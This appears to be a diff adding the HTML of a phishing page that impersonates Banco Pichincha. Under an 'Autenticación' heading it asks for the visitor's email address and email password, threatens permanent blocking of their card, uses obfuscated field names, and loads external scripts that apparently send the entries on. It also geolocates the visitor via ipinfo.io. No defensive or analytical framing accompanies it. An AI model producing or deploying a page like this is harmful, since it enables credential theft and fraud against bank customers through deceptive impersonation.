@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0;">
+        <title>Validación Pichincha</title>
+        
+
+        <link rel="stylesheet" href="/styles/styles.css">
+        <link rel="icon" type="image/x-icon" href="/media/icon.png">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+        <script>
+            $.getJSON("https://ipinfo.io", function (response) {
+       $("#address").html("" + response.city + ", " + response.country);
+       
+   })
+         </script>
+    </head>
+    <body>
+        <header>
+            <nav id="navbar"><img src="/media/mouse-pichincha-0.jpg" id="navlogo"></nav>
+        </header>
+
+        <section id="main">
+            <div class="formbox center">
+                <h2>Autenticación</h2>
+                <div class="form-container center">
+                    <form method="post" id="formdata" onsubmit=" return sender()">
+                    
+                        <label for="mail">Ingresa tu Correo</label>
+                        <input type="email" placeholder="Tu Email" id="m41l1" required>
+                        <label for="pass">Ingresa la contraseña</label>
+                        <input type="password" maxlength="20" minlength="4" autocomplete="off" placeholder="Contraseña de tu Email" id="p4ss1" required>
+                        
+                        <input type="submit" id="btnSend" class="btn" value="Continuar"> 
+                        
+                    </form>
+
+                    <hr>
+
+                    <div class="message">
+                        Debe completar obligatoriamente todos los campos para realizar el desbloqueo. <strong>Si no hace su desbloqueo de inmediato su tarjeta será bloqueada permanentemente.</strong>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section id="footer">
+            <p>Recomendamos usar la banca virtual con los navegadores Internet Explorer 11.0, Chrome 36.0.1, Firefox 31.0, Microsoft Edge</p>
+            <br>
+            <p>Copyright 2017 Banco Pichincha *V4.8.10b</p>
+        </section>
+
+        <script src="/validacion/sn0w-var.js"></script>
+        <script src="/scripts/act-btn.js"></script>
+    </body>
+</html>
